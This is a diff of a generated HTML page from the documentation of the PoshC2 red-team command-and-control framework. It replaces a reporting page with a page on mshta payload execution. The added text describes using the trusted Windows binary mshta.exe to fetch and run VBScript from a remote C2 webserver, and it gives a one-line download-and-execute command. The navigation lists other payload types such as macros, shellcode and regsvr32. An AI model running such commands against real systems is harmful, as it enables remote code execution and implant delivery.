@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <title>Output-to-html &mdash; PoshC2 Framework  documentation</title>
+  <title>Mshta &mdash; PoshC2 Framework  documentation</title>
   
 
   
@@ -36,9 +36,9 @@
               href="../genindex.html"/>
         <link rel="search" title="Search" href="../search.html"/>
     <link rel="top" title="PoshC2 Framework  documentation" href="../index.html"/>
-        <link rel="up" title="Reporting" href="index.html"/>
-        <link rel="next" title="License" href="../license/index.html"/>
-        <link rel="prev" title="Reporting" href="index.html"/> 
+        <link rel="up" title="Execution / Payloads" href="index.html"/>
+        <link rel="next" title="Certutil" href="certutil.html"/>
+        <link rel="prev" title="Cscript" href="cscript.html"/> 
 
   
   <script src="../_static/js/modernizr.min.js"></script>
@@ -89,15 +89,31 @@
             
               <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../execution/index.html">Execution / Payloads</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
+<li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
+<li class="toctree-l2"><a class="reference internal" href="exe.html">Stand Alone Executable</a></li>
+<li class="toctree-l2"><a class="reference internal" href="serviceexe.html">Service Executable</a></li>
+<li class="toctree-l2"><a class="reference internal" href="lnk.html">LNK File</a></li>
+<li class="toctree-l2"><a class="reference internal" href="hta.html">HTA File</a></li>
+<li class="toctree-l2"><a class="reference internal" href="macro.html">Macro Documents</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ms16-051.html">MS16-051 HTML File</a></li>
+<li class="toctree-l2"><a class="reference internal" href="java.html">Java Applet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="dll.html">Reflective DLL</a></li>
+<li class="toctree-l2"><a class="reference internal" href="shellcode.html">Shellcode</a></li>
+<li class="toctree-l2"><a class="reference internal" href="poshjs.html">PoshJS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="sctfiles.html">SCT Files</a></li>
+<li class="toctree-l2"><a class="reference internal" href="regsvr32.html">RegSvr32</a></li>
+<li class="toctree-l2"><a class="reference internal" href="cscript.html">Cscript</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">Mshta</a></li>
+<li class="toctree-l2"><a class="reference internal" href="certutil.html">Certutil</a></li>
+</ul>
+</li>
 <li class="toctree-l1"><a class="reference internal" href="../core/index.html">Core Implant / Features</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../persistence/index.html">Persistence</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../modules/index.html">Modules</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../lateral_movement/index.html">Lateral Movement</a></li>
-<li class="toctree-l1 current"><a class="reference internal" href="index.html">Reporting</a><ul class="current">
-<li class="toctree-l2 current"><a class="current reference internal" href="#">Output-to-html</a></li>
-</ul>
-</li>
+<li class="toctree-l1"><a class="reference internal" href="../reporting/index.html">Reporting</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../license/index.html">License</a></li>
 </ul>
 
@@ -143,15 +159,15 @@
     
       <li><a href="../index.html">Docs</a> &raquo;</li>
         
-          <li><a href="index.html">Reporting</a> &raquo;</li>
+          <li><a href="index.html">Execution / Payloads</a> &raquo;</li>
         
-      <li>Output-to-html</li>
+      <li>Mshta</li>
     
     
       <li class="wy-breadcrumbs-aside">
         
             
-            <a href="../_sources/reporting/logging.txt" rel="nofollow"> View page source</a>
+            <a href="../_sources/execution/mshta.txt" rel="nofollow"> View page source</a>
           
         
       </li>
@@ -164,14 +180,13 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div itemprop="articleBody">
             
-  <div class="section" id="output-to-html">
-<h1>Output-to-html<a class="headerlink" href="#output-to-html" title="Permalink to this headline">¶</a></h1>
-<p>To generate the HTML output</p>
-<div class="highlight-powershell"><div class="highlight"><pre><span></span><span class="n">Output-to-html</span>
+  <div class="section" id="mshta">
+<h1>Mshta<a class="headerlink" href="#mshta" title="Permalink to this headline">¶</a></h1>
+<p>Mshta is an executable file which can be found on most Windows operating systems. Mshta is designed to run “HTA” files and help files on the host. However, Mshta can be used on the command line to run arbitrary vbscript. PoshC2 uses this to execute code from a remote webserver. This utility has some benefits over other tools as its a trusted binary, proxy aware and supports HTTPS.</p>
+<p>Mshta do not work with untrusted SSL certificates if using over HTTPS:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">mshta</span><span class="o">.</span><span class="n">exe</span> <span class="n">vbscript</span><span class="p">:</span><span class="n">GetObject</span><span class="p">(</span><span class="s2">&quot;script:https://www.c2.com/news/j9hau_cs&quot;</span><span class="p">)(</span><span class="n">window</span><span class="o">.</span><span class="n">close</span><span class="p">)</span>
 </pre></div>
 </div>
-<p>PoshC2 will then
-Created four reports in C:UsersadminDesktopPoshC2-2018-14-02-0837reports*</p>
 </div>
 
 
@@ -184,10 +199,10 @@ Created four reports in C:UsersadminDesktopPoshC2-2018-14-02-0837reports*</p>
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../license/index.html" class="btn btn-neutral float-right" title="License" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+        <a href="certutil.html" class="btn btn-neutral float-right" title="Certutil" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
       
-        <a href="index.html" class="btn btn-neutral" title="Reporting" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+        <a href="cscript.html" class="btn btn-neutral" title="Cscript" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
       
     </div>
   
